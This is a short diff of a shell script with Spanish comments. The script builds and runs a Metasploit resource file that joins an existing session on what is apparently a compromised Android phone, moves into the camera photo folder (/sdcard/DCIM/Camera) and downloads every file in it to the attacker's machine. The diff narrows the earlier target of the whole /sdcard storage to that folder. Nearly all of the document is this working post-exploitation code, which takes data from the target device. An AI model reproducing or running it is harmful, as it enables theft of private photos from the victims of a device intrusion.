@@ -40,12 +40,12 @@ if [ -z "$SESSION_ID" ]; then
 fi
 
 # Generar el archivo de recursos de Metasploit
-cat <<EOL > get_data.rc
+cat <<EOL > get.rc
 sessions -i $SESSION_ID --timeout 7200
-cd /sdcard
+cd /sdcard/DCIM/Camera
 download * $DEST_DIR
 exit
 EOL
 
 # Ejecutar Metasploit con el archivo de recursos
-msfconsole -r get_data.rc
+resource get.rc
